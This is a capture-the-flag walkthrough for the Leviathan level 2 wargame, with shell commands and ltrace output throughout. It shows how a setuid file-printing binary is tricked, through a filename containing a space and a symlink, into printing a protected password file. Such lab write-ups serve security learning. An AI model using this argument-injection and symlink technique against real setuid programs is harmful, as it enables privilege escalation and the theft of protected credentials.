======================= RECON ==========================================

leviathan2@melinda:~$ ls
printfile

leviathan2@melinda:~$ file printfile 
printfile: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=d765b4023e214e3fbfe71aa63554713a57e39520, not stripped

leviathan2@melinda:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename

====================== LETS TRY THE TOO EASY SOLUTION ==================

leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                                  = -1
puts("You cant have that file..."You cant have that file...
)                                                                                            = 27
+++ exited (status 1) +++

ok that didn't work, predictable....

====================== CREATE FILE IN /tmp/whatever/ ====================

leviathan2@melinda:~$ touch /tmp/lev2sole/foo

leviathan2@melinda:~$ ltrace ./printfile /tmp/lev2solve/foo
__libc_start_main(0x804852d, 2, 0xffffd784, 0x8048600 <unfinished ...>
access("/tmp/lev2solve/foo", 4)                                                              = 0
snprintf("/bin/cat /tmp/lev2solve/foo", 511, "/bin/cat %s", "/tmp/lev2solve/foo")            = 27
system("/bin/cat /tmp/lev2solve/foo" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                       = 0
+++ exited (status 0) +++

Soooo the ELF checks access() of the input file then cats it if it's available to the user's context. 
As we know, cat can be fed as many files as we want in a single line, like so (files are empty here):

leviathan2@melinda:~$ cat /tmp/lev2solve/foo /tmp/lev2solve/fooo

==================== LETS SEE IF WE CAN BYPASS THE access() FUNCTION ===============

leviathan2@melinda:~$ ltrace ./printfile /tmp/lev2solve/foo /tmp/lev2solve/fooo
__libc_start_main(0x804852d, 3, 0xffffd754, 0x8048600 <unfinished ...>
access("/tmp/lev2solve/foo", 4)                                                              = 0
snprintf("/bin/cat /tmp/lev2solve/foo", 511, "/bin/cat %s", "/tmp/lev2solve/foo")            = 27
system("/bin/cat /tmp/lev2solve/foo" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                       = 0
+++ exited (status 0) +++

 ... that just ignored the second file ... what if we try a file with a space in the name ?!?
 
 leviathan2@melinda:~$ ltrace ./printfile /tmp/lev2solve/foo\ bar.txt
__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 <unfinished ...>
access("/tmp/lev2solve/foo bar.txt", 4)                                                                                       = 0
snprintf("/bin/cat /tmp/lev2solve/foo bar."..., 511, "/bin/cat %s", "/tmp/lev2solve/foo bar.txt")                             = 35
system("/bin/cat /tmp/lev2solve/foo bar.".../bin/cat: /tmp/lev2solve/foo: No such file or directory
/bin/cat: bar.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                        = 256
+++ exited (status 0) +++

Check it out! access() was only called once but both files we piped to cat, none of which exist.

==================== NOW FOR THE KILL =============================================

Given the previous ltrace, we see that in the 2 cat commands, only the first file name actually contains the path /tmp/lev2solve/.
So let's try to make another file /tmp/lev2solve/foo which will be a symlink to /etc/leviathan_pass/leviathan3 to print its contents.

leviathan2@melinda:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/lev2solve/foo    
leviathan2@melinda:~$ ./printfile /tmp/lev2solve/foo\ bar.txt
<Redacted password>
/bin/cat: bar.txt: No such file or directory

BINGO!
 
 
